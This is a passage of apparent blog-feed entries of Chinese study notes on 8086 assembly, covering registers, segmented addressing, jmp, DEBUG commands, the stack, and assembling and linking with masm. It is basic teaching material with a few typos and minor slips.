</blockquote>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><blockquote>
<p>AX,BX,CX,DX这四个寄存器通常用来存放一般性的数据，被称为通用寄存器。</p>
<p>8086CPU为了兼容之前版本，将16位寄存器分为两个8位寄存器：</p>
<ul>
<li>AX分为AL,AH;</li>
<li>BX分为BL,BH;</li>
<li>………</li>
</ul>
</blockquote>
<h2 id="字在寄存器中的存储"><a href="#字在寄存器中的存储" class="headerlink" title="字在寄存器中的存储"></a>字在寄存器中的存储</h2><blockquote>
<ul>
<li><strong>字节</strong>：记为Byte，一个字节由8个bit组成，可以存在8位寄存器中。</li>
<li><strong>字</strong>：记为word，一个字由两个字节组成，这两个字节分贝成为高位字节和低位字节。</li>
</ul>
<p>数制转换：</p>
<table>
<thead>
<tr>
<th></th>
<th align="center"><strong>二进制</strong></th>
<th align="center"><strong>十进制</strong></th>
<th align="center"><strong>十六进制</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>值</strong></td>
<td align="center">0100111000100000</td>
<td align="center">20000</td>
<td align="center">4(0100)、E(1110)、2(0010)、0(0000)   |   4E20</td>
</tr>
</tbody></table>
</blockquote>
<h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><table>
<thead>
<tr>
<th>汇编指令</th>
<th>控制CPU完成的操作</th>
<th>用高级语言的语法描述</th>
</tr>
</thead>
<tbody><tr>
<td>mov ax,18</td>
<td>将18送入寄存器ax</td>
<td>AX=18</td>
</tr>
<tr>
<td>mov ah,78</td>
<td>将78送入寄存器ah</td>
<td>AH=78</td>
</tr>
<tr>
<td>add ax,8</td>
<td>将AX寄存器中的数值加上8</td>
<td>AX=AX+8</td>
</tr>
<tr>
<td>mov ax,bx</td>
<td>将BX寄存器的数据送入AX</td>
<td>AX=BX</td>
</tr>
<tr>
<td>add ax,bx</td>
<td>将AX和BX的数支相加，结果存在AX中</td>
<td>AX=AX+BX</td>
</tr>
</tbody></table>
<blockquote>
<p><em>汇编指令不区分大小写</em></p>
</blockquote>
<h3 id="程序段中指令的执行情况之一"><a href="#程序段中指令的执行情况之一" class="headerlink" title="程序段中指令的执行情况之一"></a>程序段中指令的执行情况之一</h3><p>（原AX的值0000H，原BX的值0000H）</p>
<table>
<thead>
<tr>
<th>程序段中的指令</th>
<th>指令执行后AX的数据</th>
<th>指令执行后BX的数据</th>
</tr>
</thead>
<tbody><tr>
<td>mov ax,4E20H</td>
<td>4E20H</td>
<td>0000H</td>
</tr>
<tr>
<td>add ax,1406H</td>
<td>6226H</td>
<td>0000H</td>
</tr>
<tr>
<td>mov bx,2000H</td>
<td>6226H</td>
<td>2000H</td>
</tr>
<tr>
<td>add ax,bx</td>
<td>8226H</td>
<td>2000H</td>
</tr>
<tr>
<td>mov bx,ax</td>
<td>8226H</td>
<td>8226H</td>
</tr>
<tr>
<td>add ax,bx</td>
<td><strong>044CH</strong></td>
<td>8226H</td>
</tr>
</tbody></table>
<p><em>加粗部分结果本应该位1044CH，但是ax为16位寄存器，只能存放四位16进制数据，所以最高位1被舍弃，结果为044CH</em></p>
<h3 id="程序段中指令的执行情况之二"><a href="#程序段中指令的执行情况之二" class="headerlink" title="程序段中指令的执行情况之二"></a>程序段中指令的执行情况之二</h3><table>
<thead>
<tr>
<th>程序段中的指令</th>
<th>指令执行后AX中的数据</th>
<th>指令执行后BX中的数据</th>
</tr>
</thead>
<tbody><tr>
<td>mov ax,001AH</td>
<td>001AH</td>
<td>0000H</td>
</tr>
<tr>
<td>mov bx,0026H</td>
<td>001AH</td>
<td>0026H</td>
</tr>
<tr>
<td>add al,bl</td>
<td>0040H</td>
<td>0026H</td>
</tr>
<tr>
<td>add ah,bl</td>
<td>2640H</td>
<td>0026H</td>
</tr>
<tr>
<td>add bh,al</td>
<td>2640H</td>
<td>4026H</td>
</tr>
<tr>
<td>mov ah,0</td>
<td>0040H</td>
<td>4026H</td>
</tr>
<tr>
<td>add al,85H</td>
<td>00C5H</td>
<td>4026H</td>
</tr>
<tr>
<td>add al,93H</td>
<td>00<strong>58</strong>H</td>
<td>4026H</td>
</tr>
</tbody></table>
<p><em>加粗部分结果本应为158，但是16位寄存器只能存放四位16进制数据，所以1舍弃，(低位不向高位进位）</em></p>
<h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><blockquote>
<p>所有内存单元构成的存储空间是一个一维的线性空间，每个内存单元都有唯一的对应的地址，这个唯一的地址就叫做物理地址</p>
<p>CPU通过地址总线送入存储器的，必须是一个内存单元的物理地址。</p>
</blockquote>
<h2 id="16位结构CPU"><a href="#16位结构CPU" class="headerlink" title="16位结构CPU"></a>16位结构CPU</h2><blockquote>
<p>结构特性：</p>
<ul>
<li>运算器一次可以处理最多16位的数据</li>
<li>寄存器的最大宽度为16位</li>
<li>寄存器和运算器的通路位16位</li>
</ul>
</blockquote>
<h2 id="8086CPU给出物理地址的方法"><a href="#8086CPU给出物理地址的方法" class="headerlink" title="8086CPU给出物理地址的方法"></a>8086CPU给出物理地址的方法</h2><blockquote>
<p>8086CPU由20位地址总线，一次可以传输20位地址，达到1M的寻址能力。</p>
<p>8086又是16位结构，内部一次可传输16位地址</p>
<p><strong>8086CPU用在内部采用两个16位地址合成的方法来形成一个20位物理地址。</strong></p>
<p>当8086CPU要读写内存时：</p>
<ol>
<li>CPU中的相关部件提供两个16位地址，一个为段地址，另一个为偏移地址。</li>
<li>段地址和偏移地址通过内部总线送入一个叫地址加法器的部件；</li>
<li>地址加法器将两个16位地址合为一个20位地址</li>
<li>地址加法器将20位地址通过内部总线送入输入输出控制电路</li>
<li>输入输出控制电路将20位地址送入地址总线</li>
<li>20位物理地址被地址总线传送到存储器</li>
</ol>
<p>地址加法器采用： <strong>物理地址 = 段地址x16 + 偏移地址</strong></p>
</blockquote>
<h2 id="“段地址x16-偏移地址-物理地址”的本质含义"><a href="#“段地址x16-偏移地址-物理地址”的本质含义" class="headerlink" title="“段地址x16 + 偏移地址 = 物理地址”的本质含义"></a>“段地址x16 + 偏移地址 = 物理地址”的本质含义</h2><blockquote>
<p>本质含义：CPU在访问内存时，用一个<strong>基础地址</strong>（段地址x16）和相对于基础地址的<strong>偏移地址</strong>相加，给出内存单元的物理地址。</p>
</blockquote>
<h2 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h2><blockquote>
<p>内存并没有划分段，段的划分来自于CPU，由于CPU使用：段地址x16 + 偏移地址 = 物理地址的方式给出物理地址，是的我们可以用份端的方式来管理内存。</p>
<p>在变成时可以根据需要，将若干个连续的内存单元看作一个段，用段地址x16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元。</p>
</blockquote>
<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><blockquote>
<p>段地址在8086CPU的段寄存器中存放。8086CPU有四个段寄存器，分别为：CS、 DS、SS、ES.</p>
<p>当8086CPU要访问内存时，由这四个段寄存器提供内存单元的段地址。</p>
</blockquote>
<h2 id="CS和IP"><a href="#CS和IP" class="headerlink" title="CS和IP"></a>CS和IP</h2><blockquote>
<p>CS和IP是8086CPU中两个最关键的寄存器。CS为代码段寄存器，IP为指令指针寄存器。</p>
<p>在8086PC机中，设CS内容位M，IP内容位N，CPU将从M*16+N单元开始，读取一条指令并执行。</p>
<p>另一种描述：任意时刻，CPU将CS:IP指向的内容当作指令执行</p>
<p>CPU工作流程：</p>
<ol>
<li>从CD:IP指向的内存单元读取指令，读取的指令进入缓冲器。</li>
<li>IP=IP+所读取指令的长度，从而指向下一条指令。</li>
<li>执行指令，转到步骤 1 ，重复这个过程。</li>
</ol>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X04)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x04/</url>
    <content><![CDATA[<h1 id="寄存器（2）"><a href="#寄存器（2）" class="headerlink" title="寄存器（2）"></a>寄存器（2）</h1><h2 id="修改CS、IP的指令"><a href="#修改CS、IP的指令" class="headerlink" title="修改CS、IP的指令"></a>修改CS、IP的指令</h2><blockquote>
<p>在CPU中，程序员能够用指令读写的只有寄存器，可以通过改变寄存器的内容实现对CPU的控制。</p>
<p>能够改变CS、IP的内容的指令呗统称为<strong>转移指令</strong>，现在介绍jmp指令</p>
<p>若想同时修改CS、IP的内容，可以用“ jmp 段地址：偏移地址”的指令完成，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp 2AE3:3 &#x2F;&#x2F;执行后:CS&#x3D;2AE3H , IP&#x3D;0003H ,CPU将从2AE33H处读取数据。</span><br><span class="line">jmp 3:0B16 &#x2F;&#x2F;执行后，CS&#x3D;0003H  , IP&#x3D;0B16H,CPU将从00B46H处读取数据。</span><br></pre></td></tr></table></figure>

<p>若想仅修改IP的内容，可以用“jmp 某一合法寄存器”的指令。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp ax   &#x2F;&#x2F;指令执行前： ax&#x3D;1000H,CS&#x3D;2000H,IP&#x3D;0003H</span><br><span class="line">		&#x2F;&#x2F;指令执行后： ax&#x3D;1000H,CS&#x3D;2000H,IP&#x3D;1000H</span><br><span class="line">jmp bx   &#x2F;&#x2F;指令执行前： ax&#x3D;0B16H,CS&#x3D;2000H,IP&#x3D;0003H</span><br><span class="line">		&#x2F;&#x2F;指令执行后： ax&#x3D;0B16H,CS&#x3D;2000H,IP&#x3D;0B16H</span><br><span class="line">&#x2F;&#x2F;&quot;jmp 某一合法寄存器&quot;指令的功能为：用寄存器中的值修改IP。</span><br><span class="line">&#x2F;&#x2F;jmp ax 在含以上好像：mov IP,ax</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><blockquote>
<p>在编程时，可以将一组内存单元定义为一个段。</p>
<p>若将一长度&lt;=64KB的代码存入地址连续、起始地址为16的倍数的内存单元中，就可以认为这段内存是用来存放代码的，从而定义了一个<strong>代码段</strong></p>
</blockquote>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><blockquote>
<ol>
<li><p>段地址在8086CPU的段寄存器中存放。当8086CPU要访问内存时，由段寄存器提供单元的段地址。8086CPU有四个段寄存器，其中CS用来存放指令的段地址，</p>
</li>
<li><p>CS存放指令的段地址，IP存放指令的偏移地址。8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。</p>
</li>
<li><p>8086CPU的工作过程：</p>
<p> （1）从CS:IP指向的测i村单元读取指令，读取的指令进入指令缓冲器；</p>
<p> （2）IP指向下一条指令；</p>
<p> （3）执行指令（转到步骤（1），重复这个过程）</p>
</li>
</ol>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X05)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x05/</url>
    <content><![CDATA[<h1 id="win2000-汇编指令"><a href="#win2000-汇编指令" class="headerlink" title="win2000 汇编指令"></a>win2000 汇编指令</h1><h2 id="什么是debug"><a href="#什么是debug" class="headerlink" title="什么是debug"></a>什么是debug</h2><blockquote>
<p>debug是DOS、Windows都提供能实施程序调试工具，使用他可以查看CPU各种寄存器中的内容。</p>
</blockquote>
<h3 id="进入汇编模式"><a href="#进入汇编模式" class="headerlink" title="进入汇编模式"></a>进入汇编模式</h3><blockquote>
<ol>
<li>win2000下，运行中输入command</li>
<li>进入command</li>
<li>输入debug，进入debug模式</li>
</ol>
</blockquote>
<h2 id="常用到的debug功能"><a href="#常用到的debug功能" class="headerlink" title="常用到的debug功能"></a>常用到的debug功能</h2><blockquote>
<ol>
<li>用Debug的R命令查看、改变CPU寄存器中的内容   <code>-r ax（选择ax寄存器）   --&gt;  1000（ax寄存器中想要改变的值）</code></li>
<li>用Debug的D命令查看内存中的内容    <code>-d 段地址：偏移地址</code> //会列出从指定内存单元开始的128个内存单元的内容，若需要定义只看哪些，可以在后边加结束地址</li>
<li>用Debug的E命令改写内存中的内容     <code>-e 起始地址 数据 数据 数据 ····</code> 可以先使用-d查看，然后使用-e修改</li>
<li>用Debug的U命令将内存中的机器指令改变成汇编指令     <code>-u 1000:0</code>将从1000:0开始的数据翻译为汇编语言</li>
<li>用Debug的T命令执行一条机器命令    <code>执行完-r命令后，直接执行-t命令即可执行汇编命令</code></li>
<li>用Debug的A命令以汇编指令的格式在机器中写入一条机器指令     <code>-a 1000:0</code>即可执行从地址1000:0开始的自定义语句</li>
</ol>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X06)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x06/</url>
    <content><![CDATA[<h1 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h1><h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><p>字单元：即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成.高地址位存放字型数据的高位字节，低存放低位字节</p>
<p>（如一个字单元是由2，3两个内存单元组成，则这个字单元的其实地址为2，我们可是说这是2地址字单元）</p>
<h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><p>在8086PC中，测i村地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，用来存放要访问数据的段地址。</p>
<p>只有偏移地址是不能定位一个内存单元的，当执行指令时，<strong>CPU自动获取DS的数据作为段地址</strong></p>
<p>寄存器用寄存器来指明，内存单元用内存单元来指明。</p>
<h2 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h2><blockquote>
<ul>
<li>mov bx,1000H      //将1000H内存单元中的数据存入bx中。</li>
<li>mov ds,bx      //将bx寄存器中的内容存入ds寄存器中。</li>
<li>mov ax,[0]      //将1000:0处的数据存入ax寄存器中。</li>
<li>mov [0],cx      //cx中的数据送入1000:0内存单元中。</li>
</ul>
</blockquote>
<h2 id="mov，sub，add指令"><a href="#mov，sub，add指令" class="headerlink" title="mov，sub，add指令"></a>mov，sub，add指令</h2><p>mov可以有以下几种形式</p>
<blockquote>
<p>mov 寄存器，数据            比如： mov ax,8</p>
<p>mov 寄存器，寄存器         比如： mov ax，bx</p>
<p>mov 寄存器，内存单元      比如：mov ax，[0]</p>
<p>mov 内存单元，寄存器      比如： mov [0],ax</p>
<p>mov 段寄存器，寄存器       比如：mov ds,ax</p>
</blockquote>
<p>add和sub有以下几种形式</p>
<blockquote>
<p>add 寄存器，数据             比如：add ax,8</p>
<p>add 寄存器，寄存器          比如：add ax，bx</p>
<p>add 寄存器，内存单元       比如：add ax，[0]</p>
<p>add 内存单元，寄存器       比如：add [0],ax</p>
<p>sub 寄存器，数据               比如：sub,ax,9</p>
<p>sub 寄存器，寄存器           比如：sub ax,bx</p>
<p>sub 寄存器，内存单元        比如：sub ax,[0]</p>
<p>sub 内存单元，寄存器        比如：sub [0],ax</p>
</blockquote>
<h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>对于8086PC，在编程时，可以根据需要，将一组内存单元定义为一个段。</p>
<p>可以将一组长度小于64kb、地址连续，起始地址为16的倍数的内存单元专门当做存储数据的内存空间，从而定义了一个<strong>数据段</strong></p>
<blockquote>
<p>在具体操作时，可以将数据段存放在ds中。</p>
</blockquote>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol>
<li>字在内存中存储式，要用两个地址连续的内存单元来存放，字的低位字节存放在低地址单元中，高位字节存放在高地址单元中。</li>
<li>用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中</li>
<li>[address]表示一个偏移地址为address的内存单元。</li>
<li>在内存和寄存器之间传送字形数据时，高地址单元和高8位寄存器，低地址单元和低8位寄存器相对应。</li>
<li>mov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X07)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x07/</url>
    <content><![CDATA[<h1 id="寄存器（内存访问）（2）"><a href="#寄存器（内存访问）（2）" class="headerlink" title="寄存器（内存访问）（2）"></a>寄存器（内存访问）（2）</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种具有特殊访问方式的存储空间，特性是<strong>后进先出</strong>也叫作<strong>LIFO</strong>(Last In  First Out) </p>
<h3 id="入栈和出栈"><a href="#入栈和出栈" class="headerlink" title="入栈和出栈"></a>入栈和出栈</h3><blockquote>
<ul>
<li>入栈就是将一个新的元素放到栈顶</li>
<li>出栈就是从栈顶去除一个元素</li>
</ul>
</blockquote>
<h2 id="CPU提供的栈机制"><a href="#CPU提供的栈机制" class="headerlink" title="CPU提供的栈机制"></a>CPU提供的栈机制</h2><p>8086CPU提供相关的指令来以栈的方式访问内存空间，这意味着在编程时，可以将栈当做内存来使用</p>
<blockquote>
<h3 id="入栈指令-PUSH-："><a href="#入栈指令-PUSH-：" class="headerlink" title="入栈指令(PUSH)："></a>入栈指令(PUSH)：</h3><blockquote>
<p><code>push ax</code> //表示将寄存器ax中的数据送入栈中。</p>
</blockquote>
<h3 id="出栈指令-POP"><a href="#出栈指令-POP" class="headerlink" title="出栈指令(POP):"></a>出栈指令(POP):</h3><blockquote>
<p><code>pop ax</code> //表示从栈顶取出数据送入ax。</p>
</blockquote>
</blockquote>
<p>（8086CPU的入栈和出栈的指令都是以<strong>字</strong>为单位进行的）</p>
<p>在8086CPU中，有两个寄存器，SS和SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。</p>
<p><strong>任意时刻，SS:SP指向栈顶元素</strong>。（push和pop执行时，CPU从SS和SP中得到栈顶的地址。）</p>
<p>例：</p>
<blockquote>
<p><code>push ax</code>执行时，由以下两步完成：</p>
<ol>
<li><code>SP=SP-2</code>，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶。</li>
<li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新的栈顶。</li>
</ol>
</blockquote>
<blockquote>
<p><code>pop ax</code>执行时，由以下两部完成</p>
<ol>
<li>将SS:SP指向的内存单元处的数据送入ax中。</li>
<li>SP=SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新栈顶。</li>
</ol>
</blockquote>
<h2 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h2><p>push和pop命令是可以在寄存器和内存中传输数据的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 寄存器    &quot;将一个寄存器中的数据入栈&quot;</span><br><span class="line">pop 寄存器     &quot;出栈，用一个寄存器接收出栈的数据&quot;</span><br></pre></td></tr></table></figure>
<p>也可以是如下形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 段寄存器  &quot;将一个段寄存器的数据入栈&quot;</span><br><span class="line">pop 段寄存器   &quot;出栈，用一个段寄存器接收出栈的数据&quot;</span><br></pre></td></tr></table></figure>
<p>在内存单元和内存单元之间传送数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 内存单元  &quot;将一个内存字单元的字入栈&quot;</span><br><span class="line">pop 内存单元   &quot;出栈，用一个内存字单元接收出栈的数据&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0]</span><br><span class="line">pop [2]</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="栈（总结）"><a href="#栈（总结）" class="headerlink" title="栈（总结）"></a>栈（总结）</h1><blockquote>
<ol>
<li>8086CPU提供了栈操作机制，方案如下：<ul>
<li>在SS,SP中存放栈顶的短地址和偏移地址；</li>
<li>提供入栈和出栈指令，它们根据SS:SP指示的地址，按照栈的方式访问内存单元。</li>
</ul>
</li>
<li>push指令的执行步骤：（1）SP=SP-2; （2）向SS:SP指向的字单元中送入数据</li>
<li>pop指令的执行步骤：（1）从SS:SP指向的字单元中读取数据；（2）SP=SP+2</li>
<li>任意时刻，SS:SP指向栈顶的元素</li>
<li>8086CPU只记录栈顶，栈空间的大小我们要自己管理</li>
<li>用栈来暂存以后需要灰度的寄存器的内容时，寄存器出栈的书序要和入栈的顺序相反。</li>
<li>push、pop实质上是一种内存传送指令，注意他们的灵活应用。</li>
</ol>
</blockquote>
<h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N&lt;=64KB)的一组地址连续、起始地址为16的倍数的内存单元，当做栈空间来用，从而定义了一个栈段。</p>
<h1 id="段的综述"><a href="#段的综述" class="headerlink" title="段的综述"></a>段的综述</h1><blockquote>
<ul>
<li>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排</li>
<li>我们可以用一个段存放数据，将他定义为”数据段“</li>
<li>我们可以用一个段存放代码，将它定义为“代码段”</li>
<li>我们可以用一个段当做栈，将它定义为”栈段“</li>
<li>对于数据段，短地址存放在DS中，有add，mov等访问内存单元的指令时，CPU九江我们定义的数据段中的内容当做数据来访问；</li>
<li>对于代码段，将它的地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码段中的指令</li>
<li>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在 需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当做栈空间来用</li>
</ul>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X08)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x08/</url>
    <content><![CDATA[<h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><h2 id="一个源程序从写出到执行的过程"><a href="#一个源程序从写出到执行的过程" class="headerlink" title="一个源程序从写出到执行的过程"></a>一个源程序从写出到执行的过程</h2><ol>
<li><h3 id="文本编辑-–-gt-源程序文件"><a href="#文本编辑-–-gt-源程序文件" class="headerlink" title="文本编辑 –&gt;  源程序文件"></a>文本编辑 –&gt;  源程序文件</h3><p> 使用文本编辑器，用汇编语言编写汇编源程序</p>
</li>
<li><h3 id="编译链接-–-gt-可执行文件"><a href="#编译链接-–-gt-可执行文件" class="headerlink" title="编译链接  –&gt;  可执行文件"></a>编译链接  –&gt;  可执行文件</h3><p> 使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件；再用链接程序对目标文件进行链接，生成可在操作系统中直接运行的可执行文件，这一步的结果，产生了一个可在操作系统中运行的可执行文件。</p>
<blockquote>
<p>可执行文件包含两部分内容</p>
<ul>
<li>程序（从源程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li>
<li>相关的描述信息（比如，程序有多大、要占用多少内存空间等）</li>
</ul>
</blockquote>
</li>
<li><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p> 在操作系统中，执行可执行文件中的程序</p>
</li>
</ol>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><ol>
<li><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><blockquote>
<p><code>XXX segment</code></p>
<p><code>···</code></p>
<p><code>···</code></p>
<p><code>XXX ends</code></p>
<p>segment说明一个段开始，ends说明一个段结束</p>
</blockquote>
<blockquote>
<p><code>end</code></p>
<p>end是一个回避版程序的结束标记</p>
</blockquote>
<blockquote>
<p><code>assume</code></p>
<p>这条伪指令的含义为“假设”。它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关</p>
</blockquote>
</li>
<li><h3 id="源程序中的“程序”"><a href="#源程序中的“程序”" class="headerlink" title="源程序中的“程序”"></a>源程序中的“程序”</h3><p> 可以将源程序文件中的所有内容成为<strong>源程序</strong>，将最终由机器执行、处理的数据成为<strong>程序</strong></p>
<p> 程序最先由汇编指令的形式存在于源程序中，经过编译、连接后转变为机器码，存储在可执行文件中。</p>
</li>
<li><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><p> 除了汇编指令和伪指令外，还有一些标号，比如“codesg”。一个标号代表了一个地址，比如“codesg”在“segment”前面，作为一个段的名称，这个段的名称最终被编译、连接处理成一个段地址。</p>
</li>
<li><h3 id="程序的结构"><a href="#程序的结构" class="headerlink" title="程序的结构"></a>程序的结构</h3> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:abc		&#x2F;&#x2F;&quot;abc被当做胆码段来用，所以，应该将abc和cs联系起来&quot;</span><br><span class="line"></span><br><span class="line">abc segment         &#x2F;&#x2F;&quot;定义一个段，名称为abc&quot;</span><br><span class="line"></span><br><span class="line">mov ax,2			\</span><br><span class="line">add ax,ax			 --&gt;&quot;实现的指令&quot;</span><br><span class="line">add,ax,ax			&#x2F;</span><br><span class="line"></span><br><span class="line">abc ends			&#x2F;&#x2F;&quot;段在何处结束&quot;</span><br><span class="line"></span><br><span class="line">end					&#x2F;&quot;程序在何处结束&quot;</span><br></pre></td></tr></table></figure></li>
<li><h3 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h3><p> 一个程序结束后，将CPU的控制权交还给似的它可以运行的程序，这个过程称为程序返回。</p>
<p> 程序返回的指令：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure>
<h2 id="编辑源程序"><a href="#编辑源程序" class="headerlink" title="编辑源程序"></a>编辑源程序</h2><ol>
<li><p>进入CMD</p>
</li>
<li><p>运行  <code>edit</code></p>
</li>
<li><p>file-&gt;new</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>如源程序存放在C:\1.asm，编译器在<code>c:\masm</code>目录下</p>
</li>
<li><p>进入DOS模式，进入<code>C:\masm</code>目录，运行<code>masm.exe</code></p>
</li>
<li><p>如要编译的文件在<code>C:\masm</code>目录下，是1.asm，输入<code>1</code>即可。</p>
<p> 如果在 其他目录下，必须输入绝对路劲。</p>
</li>
<li><p>出现OBJ后，可直接回车生成1.obj文件，也可以指定绝对路径，如</p>
<p> <code>c:\windows\1</code></p>
</li>
<li><p>NUL.LST（提示输入列表文件名称）</p>
<p> 这个文件是编译器将源程序编译为目标文件的过程中产生的文件</p>
<p> 可直接<code>Enter</code>跳过</p>
</li>
<li><p>NUL.CRF（提示输入交叉引用文件名称）</p>
<p> 功能如编译列表文件相同</p>
<p> 可直接<code>Enter</code>跳过</p>
</li>
<li><p>编译完成后，会生成一个<code>.obj</code>的文件，这是编译所得到的结果</p>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>在对源程序进行编译后，我们需要对目标文件进行连接，从而得到可执行文件。</p>
<p>工具：微软的Overlay Linker3.60连接器</p>
</li>
<li><p>进入DOS模式，进入<code>c:\\masm</code>目录，运行link.exe</p>
</li>
<li><p>输入要连接的文件名，Enter</p>
</li>
<li><p>NUM.MAP（映像文件名称）</p>
<p> 中间结果，可Enter跳过</p>
</li>
<li><p>LIB（库文件名称）</p>
<p> 库文件中包含要调用的子程序，如果包含子程序，就需要在连接的时候，将库文件和目标文件连接在一起，生成可执行文件。</p>
<p> 如果没有，Enter跳过即可</p>
</li>
<li><p>生成exe文件。</p>
<h3 id="连接的作用"><a href="#连接的作用" class="headerlink" title="连接的作用"></a>连接的作用</h3></li>
<li><p>源程序很大时，可以分为多个源程序编译，每个都变成目标文件后，在连接的时候将他们连接到一起生成一个exe。</p>
</li>
<li><p>调用子程序时，需要连接到一起，生成一个exe</p>
</li>
<li><p>源程序–&gt;(编译)–&gt;目标文件–&gt;(连接)–&gt;可执行文件</p>
<h2 id="以简化的方式进行编译和连接"><a href="#以简化的方式进行编译和连接" class="headerlink" title="以简化的方式进行编译和连接"></a>以简化的方式进行编译和连接</h2><p>编译、连接的最终目的都是生成可执行文件，中间的中间文件都可以省略。</p>
</li>
<li><p>简洁的编译过程</p>
